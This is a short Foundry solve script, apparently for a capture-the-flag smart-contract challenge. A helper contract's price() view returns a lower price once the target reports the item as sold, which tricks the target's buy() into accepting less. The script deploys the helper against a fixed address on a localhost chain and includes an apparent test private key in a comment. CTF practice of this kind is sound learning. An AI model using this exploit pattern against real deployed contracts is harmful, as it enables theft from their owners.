// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Helper {
    address public target_;

    function trigger(address target) public {
        target_ = target;
        ITarget(target_).buy();
    }
    function price() external view returns (uint256) {
        if(ITarget(target_).isSold() == true)
            return 10;
        return 100;
    }
}
contract SolveScript is Script {
    address public target = 0x1A7A3e29c3c4b3C858f2DeD8bE6ed51A07589ecF;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.trigger(target);
        vm.stopBroadcast();
    }
}
